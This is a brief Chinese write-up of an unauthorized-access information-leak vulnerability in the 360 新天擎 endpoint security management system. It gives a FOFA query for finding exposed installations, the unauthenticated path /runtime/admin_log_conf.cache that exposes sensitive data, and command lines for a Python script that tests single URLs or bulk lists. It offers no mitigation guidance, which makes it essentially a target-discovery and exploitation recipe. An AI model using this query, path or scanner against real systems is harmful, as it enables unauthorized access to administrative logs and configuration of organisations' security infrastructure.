# 360 新天擎终端安全管理系统信息泄露漏洞

### 1.漏洞描述

360新天擎终端安全系统是面向行政单位的一系列产品安全处理方案，该终端安全系统存在未授权访问漏洞，导致一定敏感信息泄露。

### 2.fofa语法

```
title="360新天擎" && body="登录"
```

### 3.漏洞复现

```
/runtime/admin_log_conf.cache
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719813577210-1c692a9e-de04-4a64-bbf0-137fa7330aae.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### 4.py脚本使用

```
python3 360 新天擎终端安全管理系统信息泄露漏洞.py -u "http://127.0.0.1"  # 测试单个url
python3 360 新天擎终端安全管理系统信息泄露漏洞.py -f url.txt             # 测试多个url
```

